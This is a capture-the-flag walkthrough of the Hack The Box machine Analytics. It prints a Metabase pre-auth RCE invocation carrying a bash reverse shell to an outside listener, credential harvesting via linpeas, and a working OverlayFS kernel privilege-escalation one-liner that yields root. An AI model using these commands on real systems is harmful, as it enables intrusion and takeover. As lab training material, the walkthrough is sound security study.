---
icon: ubuntu
---

# Analytics - Easy

<figure><img src="../../.gitbook/assets/image (1791).png" alt="" width="120"><figcaption><p><a href="https://www.hackthebox.com/machines/analytics"><strong>Analytics</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
$ nmap -A -T4 -p- -Pn 10.10.11.233 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 18:40 EDT
Nmap scan report for 10.10.11.233
Host is up (0.035s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   88.61 ms 10.10.16.1
2   26.62 ms 10.10.11.233
```

### <mark style="color:$primary;">Port 80 HTTP</mark>

Upon visiting the site we get a redirect, I'll add it to my /etc/hosts file

<figure><img src="../../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>

```
10.10.11.233	analytical.htb
```

<figure><img src="../../.gitbook/assets/image (1767).png" alt=""><figcaption></figcaption></figure>

Clicking on the login button we get a new redirect, let's add it to our /etc/hosts file

<figure><img src="../../.gitbook/assets/image (1768).png" alt=""><figcaption></figcaption></figure>

```
10.10.11.233	analytical.htb data.analytical.htb
```

<figure><img src="../../.gitbook/assets/image (1769).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">**Metabase Pre-Auth RCE**</mark>

**A quick search for metabse reveals the following exploit. Let's clone the repo and try it**

```
git clone https://github.com/m3m0o/metabase-pre-auth-rce-poc.git
```

The script needs the **target URL**, the **setup token** and a **command** that will be executed. The setup token can be obtained through the `/api/session/properties` endpoint. Copy the value of the `setup-token` key.

<figure><img src="../../.gitbook/assets/image (1770).png" alt=""><figcaption></figcaption></figure>

Now that we have our setup-token let's run the exploit. Make sure to setup a listener on what port you want to get a reverse shell on.

```
python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"
```

<figure><img src="../../.gitbook/assets/image (1771).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1772).png" alt=""><figcaption></figcaption></figure>

After some manual enumeration, I think we may be in a docker container, let's get linpeas on the box and see what we can find

### Linpeas (Credential Exposure)

<figure><img src="../../.gitbook/assets/image (1773).png" alt=""><figcaption></figcaption></figure>

Linpeas Reveals a username and password stored inside environment variables. Seeing how this may be a docker container, I will try my chances at ssh with the creds I found.

```
ssh metalytics@analytical.htb
```

<figure><img src="../../.gitbook/assets/image (1774).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation



Success, we got in. The first thing that caught my eye was the kernel version of the machine.

<figure><img src="../../.gitbook/assets/image (1775).png" alt=""><figcaption></figcaption></figure>

### Kernel Exploit

After some Google Fu I came across the following reedit and github post that reveal how we can exploit this kernel version.

[<mark style="color:blue;">**Reddit**</mark> ](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?ref=secjuice.com)<mark style="color:$primary;">**&**</mark> [<mark style="color:blue;">**Github**</mark>](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

Let's test the exploit we found on reddit and see if it works

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
```

```
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

<figure><img src="../../.gitbook/assets/image (1788).png" alt=""><figcaption></figcaption></figure>

We see that it works, let's modify the script and get a shell as root

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
```

```
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/image (1789).png" alt=""><figcaption></figcaption></figure>
